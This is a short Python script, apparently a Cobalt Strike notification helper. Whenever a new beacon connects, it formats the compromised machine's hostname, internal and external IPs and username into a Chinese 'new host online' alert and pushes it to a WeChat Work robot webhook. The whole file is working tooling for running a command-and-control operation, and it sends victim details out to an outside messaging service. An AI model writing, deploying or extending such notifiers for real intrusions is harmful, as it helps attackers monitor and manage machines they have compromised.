# encoding:utf-8
import argparse
import random
import string
from WorkWeixinRobot.work_weixin_robot import WWXRobot


def cs_xx():
    parser = argparse.ArgumentParser(description='Beacon Info')
    parser.add_argument('--computername')
    parser.add_argument('--internalip')
    parser.add_argument('--externalip')
    parser.add_argument('--username')
    args = parser.parse_args()

    internalip = args.internalip
    externalip = args.externalip
    computername = args.computername
    username = args.username
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

    content = """CobaltStrike 上线提醒\n ━━━━━━☠️─────── \n您有新主机上线啦 ！\n主机名：{}\n内部IP：{}\n外部IP：cip.cc/{}\n用户名：{}\nToken：{}\n请注意查收哦 ~\n ━━━━━━☠️─────── """.format(computername, internalip, externalip, username, ran_str)
    return content

if __name__ == '__main__':
    #输入企业微信机器人的key值
    wwx = WWXRobot(key='替换企业微信机器人的key值')
    wwx.send_text(content=cs_xx())